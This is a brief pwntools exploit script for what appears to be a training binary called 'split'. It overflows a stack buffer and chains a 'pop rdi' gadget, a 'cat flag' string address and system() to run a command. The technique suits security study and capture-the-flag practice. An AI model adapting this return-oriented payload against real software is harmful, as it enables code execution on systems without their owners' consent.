from pwn import *

p = process('./split')
elf = ELF('./split')

system_addr = elf.symbols['system']
cat_flag_addr = 0x00601060
pop_rdi_ret = 0x0000000000400883
pad = 'A'*40

payload = pad+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)

p.sendline(payload)
p.interactive()

